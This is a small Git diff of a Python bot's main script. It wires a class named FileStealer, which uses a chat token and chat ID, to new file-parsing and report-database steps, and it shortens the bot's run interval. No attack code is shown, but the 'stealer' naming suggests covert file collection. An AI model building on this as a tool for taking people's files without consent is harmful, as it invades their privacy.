@@ -2,6 +2,8 @@ import os
 
 from dotenv import load_dotenv
 
+from bot.file_parser import FileParser
+from bot.reports_db import ReportDataBase
 from bot.stealer_bot import FileStealer
 
 load_dotenv()
@@ -19,7 +21,14 @@ def main():
         raise ValueError('Отсутствует ID чата в переменных окружения')
 
     file_stealer = FileStealer(token, chat_id)
-    file_stealer.run(60)
+    file_stealer.run(20)
+
+    parser_client = FileParser()
+    data = parser_client.parse_file()
+
+    db_client = ReportDataBase()
+    query_data = db_client.insert_report(data)
+    db_client.save_to_database(query_data)
 
 
 if __name__ == '__main__':
